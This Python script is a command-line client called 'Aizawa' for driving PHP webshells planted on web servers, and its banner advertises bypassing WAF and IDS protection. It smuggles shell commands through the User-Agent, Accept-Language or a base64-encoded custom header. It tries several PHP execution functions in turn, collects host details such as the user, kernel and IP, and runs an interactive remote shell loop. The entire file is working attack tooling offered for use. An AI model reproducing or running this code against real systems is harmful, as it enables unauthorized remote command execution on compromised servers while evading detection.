#!/usr/bin/env python
######################################################
##                                                  ##
##                  A I Z A W A                     ##
##                                                  ##
## Simple command Line webshell by @elliottophellia ##
##                                                  ##
######################################################


# Imports


import re
import sys
import httpx
import base64
import validators


# Colors


bold = "\033[1m"
red = "\033[31m"
clear = "\033[0m"
cyan = "\033[36m"
blue = "\033[34m"
purple = "\033[35m"
green = "\033[32m"
yellow = "\033[33m"


# Functions


def http_user_agent_get(url, cmd):
    headers = {
        "User-Agent": cmd,
    }
    c = httpx.Client(headers=headers, verify=False)
    r = c.get(url, follow_redirects=True)
    result = r.text
    c.close()
    return result


def http_accept_language_get(url, cmd):
    headers = {
        "Accept-Language": cmd,
    }
    c = httpx.Client(headers=headers, verify=False)
    r = c.get(url, follow_redirects=True)
    result = r.text
    c.close()
    return result


def http_user_agent_post(url, data, cmd):
    headers = {
        "User-Agent": cmd,
    }
    c = httpx.Client(headers=headers, verify=False)
    r = c.post(url, data=data, follow_redirects=True)
    result = r.text
    c.close()
    return result


def http_accept_language_post(url, data, cmd):
    headers = {
        "Accept-Language": cmd,
    }
    c = httpx.Client(headers=headers, verify=False)
    r = c.post(url, data=data, follow_redirects=True)
    result = r.text
    c.close()
    return result


def http_aizawa_ninja(url, cmd):
    headers = {
        "Aizawa-Ninja": base64.b64encode(cmd.encode('utf-8')),
    }
    c = httpx.Client(headers=headers, verify=False)
    r = c.get(url, follow_redirects=True)
    result = r.text
    c.close()
    return result


def execute(url, cmd, type):
    match type:

        case "ping":

            c = httpx.Client(verify=False)

            try:
                r = c.get(url, follow_redirects=True)

                if r.status_code != 200:
                    print(bold + yellow + 'WARNING!' + clear + '\n' + red + 'ERROR' +
                          clear + ': Invalid HTTP response code\nPlease check the URL and try again\n')
                    sys.exit()

            except httpx.RequestError as e:
                print(bold + yellow + 'WARNING!' + clear + '\n' + red + 'ERROR' +
                      clear + ': URL is not reachable\nPlease check the URL and try again\n')
                sys.exit()

            finally:
                c.close()

        case "get":
            c = httpx.Client(verify=False)
            r = c.get(url+cmd, follow_redirects=True)
            result = r.text
            if not result:
                result = red + 'ERROR' + clear + '\n'
            c.close()
            return result

        case "post":
            c = httpx.Client(verify=False)
            r = c.post(url, data=cmd, follow_redirects=True)
            result = r.text
            if not result:
                result = red + 'ERROR' + clear + '\n'
            c.close()
            return result

        case "http_user_agent_get":
            result = http_user_agent_get(url + '?cmd=system', cmd)
            if not result:
                result = http_user_agent_get(url + '?cmd=proc_open', cmd)
            elif not result:
                result = http_user_agent_get(url + '?cmd=popen', cmd)
            elif not result:
                result = http_user_agent_get(url + '?cmd=passthru', cmd)
            elif not result:
                result = http_user_agent_get(url + '?cmd=shell_exec', cmd)
            elif not result:
                result = http_user_agent_get(url + '?cmd=exec', cmd)
            elif not result:
                result = red + 'ERROR' + clear + '\n'
            return result

        case "http_accept_language_get":
            result = http_accept_language_get(url + '?cmd=system', cmd)
            if not result:
                result = http_accept_language_get(url + '?cmd=proc_open', cmd)
            elif not result:
                result = http_accept_language_get(url + '?cmd=popen', cmd)
            elif not result:
                result = http_accept_language_get(url + '?cmd=passthru', cmd)
            elif not result:
                result = http_accept_language_get(url + '?cmd=shell_exec', cmd)
            elif not result:
                result = http_accept_language_get(url + '?cmd=exec', cmd)
            elif not result:
                result = red + 'ERROR' + clear + '\n'
            return result

        case "http_user_agent_post":
            result = http_user_agent_post(url, 'cmd=system', cmd)
            if not result:
                result = http_user_agent_post(url, 'cmd=proc_open', cmd)
            elif not result:
                result = http_user_agent_post(url, 'cmd=popen', cmd)
            elif not result:
                result = http_user_agent_post(url, 'cmd=passthru', cmd)
            elif not result:
                result = http_user_agent_post(url, 'cmd=shell_exec', cmd)
            elif not result:
                result = http_user_agent_post(url, 'cmd=exec', cmd)
            elif not result:
                result = red + 'ERROR' + clear + '\n'
            return result

        case "http_accept_language_post":
            result = http_accept_language_post(url, 'cmd=system', cmd)
            if not result:
                result = http_accept_language_post(url, 'cmd=proc_open', cmd)
            elif not result:
                result = http_accept_language_post(url, 'cmd=popen', cmd)
            elif not result:
                result = http_accept_language_post(url, 'cmd=passthru', cmd)
            elif not result:
                result = http_accept_language_post(url, 'cmd=shell_exec', cmd)
            elif not result:
                result = http_accept_language_post(url, 'cmd=exec', cmd)
            elif not result:
                result = red + 'ERROR' + clear + '\n'
            return result

        case "http_aizawa_ninja_eval":
            result = http_aizawa_ninja(url, 'system~' + cmd)
            if not result:
                result = http_aizawa_ninja(url, 'passthru~' + cmd)
            elif not result:
                result = http_aizawa_ninja(url, 'shell_exec~' + cmd)
            elif not result:
                result = http_aizawa_ninja(url, 'exec~' + cmd)
            elif not result:
                result = red + 'ERROR' + clear + '\n'
            return result

    if type in ["http_aizawa_ninja_concat", "http_aizawa_ninja_debug", "http_aizawa_ninja_gc", "http_aizawa_ninja_json", "http_aizawa_ninja_filter"]:
        result = http_aizawa_ninja(url, cmd)
        if not result:
            result = red + 'ERROR' + clear + '\n'
        return result


def banner():
    print(yellow + '\n   ___   ________  ___ _      _____ \n  / _ | /  _/_  / / _ | | /| / / _ |\n / __ |_/ /  / /_' + blue + '/ __ | |/ |/ / __ |\n/_/ |_/___/ /___/_/ |_|__/|__/_/ |_|' + clear +
          '\nA Super Simple Command Line Webshell\nFor Bypassing Any Kind of WAF or IDS\nCode by ' + bold + '   @' + red + 'elliottophellia' + clear + '    ' + bold + '#' + red + 'V' + purple + 'S' + blue + 'P' + yellow + 'O' + clear + '\n')


# Main

if __name__ == "__main__":

    # Print banner

    banner()

    # Get URL and check if valid

    url = sys.argv[1] if len(sys.argv) > 1 else input("Webshell URL: ")
    if not validators.url(url):
        print(bold + yellow + 'WARNING!' + clear + '\n' + red + 'ERROR' + clear +
              ': Invalid URL format\nThis does not appear to be a valid URL/IP address\nPlease check the input and try again\n')
        sys.exit()

    # Remove any characters after the file extension

    regex = re.compile(r'^.*\.[a-zA-Z]+', re.MULTILINE)
    remove_char = regex.findall(url)
    url = remove_char[0]

    # Check if URL is alive and reachable

    execute(url, '', 'ping')

    # Get filename and strip the domain

    filename = url[url.rfind('/') + 1:]

    # Classify the webshell type based on the filename

    patterns_to_types = {
        r'get_aizawa_hal_(.*?)\.': 'http_accept_language_get',
        r'get_aizawa_hua_(.*?)\.': 'http_user_agent_get',
        r'post_aizawa_hal_(.*?)\.': 'http_accept_language_post',
        r'post_aizawa_hua_(.*?)\.': 'http_user_agent_post',
        r'aizawa_ninja_eval_(.*?)\.': 'http_aizawa_ninja_eval',
        r'aizawa_ninja_concat_(.*?)\.': 'http_aizawa_ninja_concat',
        r'aizawa_ninja_debug_(.*?)\.': 'http_aizawa_ninja_debug',
        r'aizawa_ninja_gc_(.*?)\.': 'http_aizawa_ninja_gc',
        r'aizawa_ninja_json_(.*?)\.': 'http_aizawa_ninja_json',
        r'aizawa_ninja_filter_(.*?)\.': 'http_aizawa_ninja_filter',
    }

    type = None

    for pattern, t in patterns_to_types.items():
        match = re.findall(pattern, filename)
        if match:
            type = t
            break

    if type is None:
        print(bold + yellow + 'WARNING!' + clear + '\n' + red + 'ERROR' + clear +
              ': Invalid filename\nThis does not appear to be a valid Aizawa Webshell\nPlease check the URL and try again\n')
        sys.exit()

    # Get essential information

    # Get user and host

    user = execute(url, 'whoami', type)
    host = execute(url, 'hostname', type)
    pwd = execute(url, 'pwd', type)

    # Return default values if not found or error

    user = 'aizawaema' if not user or user == '\033[31mERROR\033[0m\n' else re.sub(
        r'\s+', '', user)
    host = 'virtualesport' if not host or host == '\033[31mERROR\033[0m\n' else re.sub(
        r'\s+', '', host)
    pwd = '~/unknown/path' if not pwd or pwd == '\033[31mERROR\033[0m\n' else re.sub(
        r'\s+', '', pwd)

    # Print essential information
    if type in ["http_aizawa_ninja_concat", "http_aizawa_ninja_debug", "http_aizawa_ninja_gc", "http_aizawa_ninja_json", "http_aizawa_ninja_filter"]:
        print(bold + green +
              'Successfully connected to Aizawa Webshell Ninja Edition!' + clear + '\n')
    else:
        print(bold + green + 'Successfully connected to Aizawa Webshell!' + clear + '\n')
        if type in ["http_accept_language_get", "http_user_agent_get"]:
            print(
                bold + 'Kernel           : ' + clear + execute(url, "?unamea", "get") + '\n' +
                bold + 'Server           : ' + clear + execute(url, "?server", "get") + '\n' +
                bold + 'Safe Mode        : ' + clear + execute(url, "?safe_mode", "get") + '\n' +
                bold + 'Server IP        : ' + clear + execute(url, "?server_ip", "get") + '\n' +
                bold + 'Client IP        : ' + clear + execute(url, "?client_ip", "get") + '\n' +
                bold + 'Disable Function : ' + clear +
                execute(url, "?disable_functions", "get") + '\n'
            )
        elif type in ["http_accept_language_post", "http_user_agent_post"]:
            print(
                bold + 'Kernel           : ' + clear + execute(url, "unamea", "post") + '\n' +
                bold + 'Server           : ' + clear + execute(url, "server", "post") + '\n' +
                bold + 'Safe Mode        : ' + clear + execute(url, "safe_mode", "post") + '\n' +
                bold + 'Server IP        : ' + clear + execute(url, "server_ip", "post") + '\n' +
                bold + 'Client IP        : ' + clear + execute(url, "client_ip", "post") + '\n' +
                bold + 'Disable Function : ' + clear +
                execute(url, "disable_functions", "post") + '\n'
            )

    # Initialize the shell

    while True:
        try:
            # Get command from user

            cmd = input(bold + yellow + user + clear + '@' + bold +
                        blue + host + clear + ' ' + purple + pwd + clear + ' % ')
            if cmd == 'exit' or cmd == 'quit':
                sys.exit()
            if not cmd:
                continue

            # Execute command and print result

            print('\n' + cyan + execute(url, cmd, type) + clear)

        except KeyboardInterrupt:
            print("\nCtrl + C detected. Exiting...")
            sys.exit()
